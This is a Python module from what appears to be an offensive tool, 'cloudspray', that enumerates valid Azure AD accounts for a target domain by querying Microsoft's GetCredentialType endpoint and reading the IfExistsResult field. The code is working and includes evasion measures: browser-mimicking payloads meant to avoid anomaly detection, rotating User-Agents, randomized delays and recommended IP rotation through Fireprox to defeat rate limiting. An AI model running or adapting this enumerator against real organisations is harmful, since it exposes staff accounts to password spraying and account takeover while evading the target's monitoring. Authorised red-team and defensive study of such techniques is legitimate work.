"""Azure AD GetCredentialType enumeration.

Semi-passive technique that queries the GetCredentialType endpoint to determine
whether an email address corresponds to a valid Azure AD account. No authentication
required, but Microsoft applies aggressive rate limiting.

How it works:
    The ``GetCredentialType`` endpoint is part of Microsoft's login flow. When a
    user enters their email on the Microsoft sign-in page, the browser calls
    this endpoint to determine what authentication method to present (password,
    federated IdP redirect, FIDO key, etc.). A side-effect of this lookup is
    that the ``IfExistsResult`` field in the JSON response reveals whether the
    account exists:

    - **0** -- the account exists in the tenant (the most common "valid" signal).
    - **1** -- the account does not exist.
    - **5** -- the account exists but belongs to a different tenant/realm (still
      a valid account, just federated elsewhere).
    - **6** -- the account exists in a different realm (similar to 5).
    - **Other values** -- typically indicate throttling or an unrecognized
      response; treated as ambiguous.

    The JSON payload sent to this endpoint mirrors what a real browser sends
    during the sign-in flow, including fields like ``isOtherIdpSupported`` and
    ``isFidoSupported``, to blend in with legitimate traffic.

Why this technique is useful:
    Like OneDrive probing, this method requires no authentication and generates
    no sign-in log entries in the target tenant. However, Microsoft monitors
    this endpoint for abuse and will throttle callers aggressively, returning
    useless ``IfExistsResult`` values when the rate limit kicks in. For this
    reason the enumerator uses longer inter-request delays (1-3 seconds) and
    benefits significantly from Fireprox IP rotation.

Dependencies:
    - ``cloudspray.constants.USER_AGENTS`` -- rotated User-Agent strings.
    - ``cloudspray.state.db.StateDB`` -- result persistence.
    - ``cloudspray.reporting.console.ConsoleReporter`` -- live terminal output.
"""

import random
import time

import requests

from cloudspray.constants import USER_AGENTS
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB
from cloudspray.state.models import EnumResult
from cloudspray.utils import normalize_email

METHOD_NAME = "msol"

# The GetCredentialType endpoint is part of the Azure AD login flow. It accepts
# a JSON POST with a username and returns metadata about the authentication
# methods available for that account. The key field is ``IfExistsResult``.
CREDENTIAL_TYPE_URL = "https://login.microsoftonline.com/common/GetCredentialType"


class MSOLEnumerator:
    """Enumerate users via Azure AD GetCredentialType endpoint.

    Semi-passive: no authentication required, but heavily rate-limited.
    Calls ``POST https://login.microsoftonline.com/common/GetCredentialType``
    for each candidate email and inspects the ``IfExistsResult`` field.

    Response interpretation:
        - ``IfExistsResult == 0`` -- user exists in this tenant.
        - ``IfExistsResult == 1`` -- user does not exist.
        - ``IfExistsResult == 5 or 6`` -- exists but in a different tenant/realm.
        - Other values or throttling -- unknown/ambiguous.

    Usage example::

        enumerator = MSOLEnumerator("contoso.com", db, reporter)
        valid = enumerator.enumerate(["john.smith", "jane.doe@contoso.com"])

    Args passed to ``__init__``:
        domain: Target tenant domain (e.g. ``contoso.com``).
        db: State database for persisting enumeration results.
        reporter: Console reporter for real-time output and debug messages.
        proxy_session: Optional pre-configured ``requests.Session`` (e.g. one
            routed through Fireprox) for IP rotation. Highly recommended for
            this technique due to Microsoft's aggressive rate limiting.
    """

    def __init__(
        self,
        domain: str,
        db: StateDB,
        reporter: ConsoleReporter,
        proxy_session: requests.Session | None = None,
    ):
        self._domain = domain
        self._db = db
        self._reporter = reporter
        # Fireprox session is especially important here -- Microsoft will
        # throttle a single IP quickly on this endpoint.
        self._session = proxy_session or requests.Session()

    def _build_request_body(self, email: str) -> dict:
        """Build the JSON payload for the GetCredentialType request.

        The payload mirrors what a real browser sends during the Microsoft
        sign-in flow. Including all standard fields helps the request blend
        in with legitimate traffic and avoids triggering anomaly detection.

        Args:
            email: The email address to look up.

        Returns:
            Dictionary ready to be serialized as JSON in the POST body.
        """
        return {
            "Username": email,
            "isOtherIdpSupported": True,     # support federated identity providers
            "checkPhones": False,            # skip phone-based auth lookup
            "isRemoteNGCSupported": True,    # support Windows Hello / NGC keys
            "isCookieBannerShown": False,    # cookie banner state
            "isFidoSupported": True,         # support FIDO2 security keys
            "originalRequest": "",           # empty for direct navigation
            "country": "US",                 # locale hint
            "forceotclogin": False,          # don't force one-time-code login
            "isExternalFederationDisallowed": False,
            "isRemoteConnectSupported": False,
            "federationFlags": 0,            # default federation behavior
            "isSignup": False,               # this is a sign-in, not sign-up
            "flowToken": "",                 # no existing flow token
            "isAccessPassSupported": True,   # support Temporary Access Pass
        }

    def _check_user(self, email: str) -> bool | None:
        """Check a single user against the GetCredentialType endpoint.

        Sends one POST request and interprets the ``IfExistsResult`` field
        from the JSON response.

        Args:
            email: Fully qualified email address to look up.

        Returns:
            ``True`` if the user definitely exists, ``False`` if the account
            was not found, or ``None`` if the result was ambiguous (e.g.
            throttled, non-200 response, unparseable JSON).
        """
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS),
        }

        try:
            response = self._session.post(
                CREDENTIAL_TYPE_URL,
                json=self._build_request_body(email),
                headers=headers,
                timeout=10,
            )
        except requests.RequestException as exc:
            self._reporter.debug(f"Request failed for {email}: {exc}")
            return None

        if response.status_code != 200:
            # Non-200 likely means Microsoft is throttling us or the endpoint
            # is temporarily unavailable.
            self._reporter.debug(
                f"Non-200 response for {email}: HTTP {response.status_code}"
            )
            return None

        try:
            data = response.json()
        except ValueError:
            self._reporter.debug(f"Invalid JSON in response for {email}")
            return None

        # IfExistsResult is the key oracle for user existence.
        if_exists = data.get("IfExistsResult")

        if if_exists == 0:
            # Account found in this tenant.
            return True
        if if_exists == 1:
            # Account definitively does not exist.
            return False
        if if_exists in (5, 6):
            # User exists but is federated to a different tenant/realm.
            # Still counts as a valid account for our purposes.
            return True

        # Any other value (commonly seen during throttling) is unreliable.
        self._reporter.debug(
            f"Ambiguous IfExistsResult={if_exists} for {email}"
        )
        return None

    def enumerate(self, usernames: list[str]) -> list[str]:
        """Probe GetCredentialType for each user and record results.

        Iterates through the candidate list, sending one POST per user to the
        GetCredentialType endpoint. Ambiguous results (``None`` from
        ``_check_user``) are skipped entirely and not persisted, since they
        provide no useful signal and may indicate throttling.

        Delays between requests are longer than the OneDrive technique
        (1-3 seconds) because Microsoft rate-limits this endpoint
        aggressively.

        Args:
            usernames: Candidate email addresses (or bare usernames, which
                will be normalized to ``user@domain``).

        Returns:
            List of email addresses confirmed to exist via this technique.

        Raises:
            No exceptions are raised; network errors are caught internally
            and logged as debug messages.
        """
        confirmed: list[str] = []
        # Deduplicate while preserving the caller's ordering.
        usernames = list(dict.fromkeys(usernames))

        for username in usernames:
            email = normalize_email(username, self._domain)
            check_result = self._check_user(email)

            if check_result is None:
                # Ambiguous results are not persisted -- recording them would
                # pollute the database with unreliable data.
                self._reporter.debug(f"Skipping ambiguous result for {email}")
                time.sleep(random.uniform(1.0, 3.0))
                continue

            if check_result:
                confirmed.append(email)

            result = EnumResult(username=email, method=METHOD_NAME, exists=check_result)
            self._db.record_enum_result(result)
            self._reporter.print_enum_result(email, check_result, METHOD_NAME)

            # Longer delay due to rate limiting sensitivity on this endpoint.
            time.sleep(random.uniform(1.0, 3.0))

        return confirmed
